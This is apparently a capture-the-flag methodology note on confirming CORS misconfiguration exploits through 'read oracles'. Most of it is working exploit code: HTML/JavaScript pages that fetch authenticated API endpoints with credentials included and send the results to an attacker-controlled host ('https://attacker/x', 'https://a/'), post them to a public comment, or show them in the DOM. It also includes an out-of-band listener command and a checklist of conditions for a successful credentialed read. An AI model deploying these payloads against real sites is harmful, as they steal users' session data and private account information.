# Read oracles — proving the CORS read actually happened

The CORS `confirms` needs the data to reach you — not just the ACAO
header. The oracles that prove the read.

---

## 1. The exfil-hit oracle — the data at your listener

```text
the read's proof: the victim's fetch delivered the sensitive data
to your endpoint. the OOB listener captures it.
```

```bash
python3 tools/web/oob_listener.py serve --port 8001 &
python3 tools/web/oob_listener.py hits
# a hit with the session data → the read worked
```

## 2. The DOM-readback oracle — the page that displays the data

```html
<!-- the exploit page writes the read data to the DOM -->
<script>
fetch('https://t/api/me',{credentials:'include'})
 .then(r=>r.json())
 .then(d=>{document.body.innerText=JSON.stringify(d)})
</script>
```

A bot that screenshots the page, or an admin who views it — the
data lands where you can read it back.

## 3. The write-back oracle — the data posted to the target

```html
<!-- the exploit page POSTs the read data to a public endpoint -->
<script>
fetch('https://t/api/me',{credentials:'include'})
 .then(r=>r.json())
 .then(d=>fetch('https://t/comment',{method:'POST',
   headers:{'Content-Type':'application/json'},
   body:JSON.stringify({text:d.flag})}))
</script>
```

The flag lands in a comment/profile you can read same-origin.

## 4. The redirect-load oracle — the flag in the URL

```html
<!-- the exploit page redirects with the flag in the URL -->
<script>
fetch('https://t/api/me',{credentials:'include'})
 .then(r=>r.json())
 .then(d=>{location='https://attacker/x?f='+d.flag})
</script>
```

## 5. The multi-read oracle — a chain of reads

```html
<!-- read token → read flag → exfil -->
<script>
fetch('https://t/api/token',{credentials:'include'})
 .then(r=>r.json())
 .then(t=>fetch('https://t/api/flag?k='+t.k,{credentials:'include'}))
 .then(r=>r.text()).then(d=>fetch('https://a/?d='+d))
</script>
```

## 6. The readback-vs-claim rule

```text
the CORS read is 'real' only when the data reaches you — the exfil
hit, the DOM display, the write-back. 'the fetch returned 200' in
YOUR console isn't proof the BOT's fetch worked — the bot's session,
cookie, and context differ.
```

## 7. The attribution — was it the bot's read

```text
the exfil data must be attributable to the bot's session — a unique
field (a flag cookie, an admin-only value) that proves the read ran
under the bot, not your own test.
```

## 8. The partial-read falsifier

```text
the fetch fired but the data was empty/public — the credential
didn't ride, or the endpoint isn't sensitive. a non-credentialed
read isn't the vuln.
```

## 9. The timing oracle — a read that can't exfil

```html
<!-- the read's success measurable by timing — a rare fallback -->
<script>
var t0=performance.now();
fetch('https://t/api/x',{credentials:'include'})
 .then(r=>r.text()).then(d=>{
   var t=performance.now()-t0;
   fetch('https://a/?t='+t);  // the timing itself is the leak
 })
</script>
```

## 10. The oracle checklist

```text
1. the fetch fires cross-origin — Origin is yours/null
2. the response is readable — ACAO allows, ACAC if credentialed
3. the credential rides — SameSite=None cookie or a set header
4. the data is sensitive — the flag, not public data
5. the exfil reaches you — the listener hit, the DOM, the write-back
```
